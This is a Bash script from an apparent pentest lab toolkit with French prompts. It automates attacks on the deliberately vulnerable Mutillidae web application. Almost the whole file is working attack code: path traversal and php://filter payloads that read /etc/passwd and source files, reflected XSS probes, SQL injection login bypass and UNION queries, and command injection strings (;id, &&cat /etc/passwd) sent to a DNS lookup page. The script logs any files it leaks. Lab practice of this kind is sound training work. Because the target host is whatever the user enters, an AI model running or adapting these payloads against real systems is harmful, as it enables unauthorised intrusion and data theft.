#!/bin/bash
# exploits.sh - Mutillidae exploits
# Place in: ~/ghost00ls/modules/labs/mutillidae/exploits.sh

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/mutillidae_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Exploits Mutillidae
# ==========================

exploit_lfi() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Mutillidae - LFI]${NC}"
    
    local IP PORT BASE PAYLOAD
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://$IP:$PORT/mutillidae"
    
    local payloads=(
        "../../../../etc/passwd"
        "../../../../etc/hosts"
        "../../config.inc"
        "php://filter/convert.base64-encode/resource=index.php"
    )
    
    for payload in "${payloads[@]}"; do
        local url="${BASE}/index.php?page=$(urlenc "$payload")"
        echo -e "${YELLOW}‚ñ∂ Testing: $payload${NC}"
        
        local tmpf=$(mktemp)
        curl -s -L --max-time 10 -o "$tmpf" "$url"
        
        if grep -q "root:" "$tmpf" 2>/dev/null; then
            echo -e "${GREEN}‚úÖ LFI SUCCESS: /etc/passwd leaked${NC}"
            cp "$tmpf" "$LOG_DIR/lfi_passwd_$(date +%s).txt"
            log_exploit "$LOG_DIR/lfi.log" "SUCCESS" "LFI: $payload"
            head -n 20 "$tmpf"
            rm -f "$tmpf"
            break
        elif grep -q "127.0.0.1" "$tmpf" 2>/dev/null; then
            echo -e "${GREEN}‚úÖ LFI SUCCESS: /etc/hosts${NC}"
        else
            echo -e "${YELLOW}‚ö†Ô∏è No obvious LFI success${NC}"
        fi
        
        rm -f "$tmpf"
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_xss() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Mutillidae - XSS]${NC}"
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://$IP:$PORT/mutillidae"
    
    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "';alert(String.fromCharCode(88,83,83))//'"
    )
    
    echo -e "${YELLOW}‚ñ∂ Testing XSS payloads...${NC}"
    
    for payload in "${payloads[@]}"; do
        local enc_payload=$(urlenc "$payload")
        local url="${BASE}/index.php?page=user-info.php&username=${enc_payload}"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -L --max-time 10 "$url")
        
        if echo "$resp" | grep -F "$payload" >/dev/null 2>&1; then
            echo -e "${GREEN}‚úÖ XSS reflected: $payload${NC}"
            log_exploit "$LOG_DIR/xss.log" "SUCCESS" "XSS: $payload"
        else
            echo -e "${YELLOW}‚ö†Ô∏è Not reflected${NC}"
        fi
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_sqli() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Mutillidae - SQL Injection]${NC}"
    
    check_tools curl
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://$IP:$PORT/mutillidae"
    
    local payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "admin'--"
        "' UNION SELECT NULL, user(), database()--"
    )
    
    echo -e "${YELLOW}‚ñ∂ Testing SQLi on login form...${NC}"
    
    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp
        resp=$(curl -s -L --max-time 10 -X POST "$BASE/index.php?page=login.php" \
            -d "username=${payload}&password=x&login-php-submit-button=Login")
        
        if echo "$resp" | grep -qi "logged in\|welcome\|home"; then
            echo -e "${GREEN}‚úÖ SQLi SUCCESS${NC}"
            log_exploit "$LOG_DIR/sqli.log" "SUCCESS" "SQLi: $payload"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è No obvious SQLi success${NC}"
        fi
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

exploit_command_injection() {
    clear; banner
    echo -e "${MAGENTA}üß™ [Mutillidae - Command Injection]${NC}"
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "üåê Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://$IP:$PORT/mutillidae"
    
    local payloads=(
        ";id"
        "|whoami"
        "&&cat /etc/passwd"
        "\`uname -a\`"
    )
    
    echo -e "${YELLOW}‚ñ∂ Testing command injection...${NC}"
    
    for payload in "${payloads[@]}"; do
        local enc_payload=$(urlenc "127.0.0.1${payload}")
        local url="${BASE}/index.php?page=dns-lookup.php&target_host=${enc_payload}"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -L --max-time 10 "$url")
        
        if echo "$resp" | grep -E "uid=|root:|Linux" >/dev/null 2>&1; then
            echo -e "${GREEN}‚úÖ Command Injection SUCCESS${NC}"
            log_exploit "$LOG_DIR/cmdinj.log" "SUCCESS" "CmdInj: $payload"
            echo "$resp" | grep -A5 -B5 "uid="
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è No obvious command execution${NC}"
        fi
    done
    
    read -p "üëâ Entr√©e pour revenir..."
}

# ==========================
# Menu principal
# ==========================

menu_exploits() {
    while true; do
        clear; banner
        echo -e "${CYAN}=== üí£ Exemples d'exploitation Mutillidae ===${NC}"
        echo
        echo -e "${GREEN}1) LFI (Local File Inclusion)${NC}"
        echo -e "${GREEN}2) XSS (Cross-Site Scripting)${NC}"
        echo -e "${GREEN}3) SQL Injection${NC}"
        echo -e "${GREEN}4) Command Injection${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_lfi ;;
            2) exploit_xss ;;
            3) exploit_sqli ;;
            4) exploit_command_injection ;;
            0) return ;;
            *) echo -e "${RED}‚ùå Option invalide${NC}"; sleep 1 ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
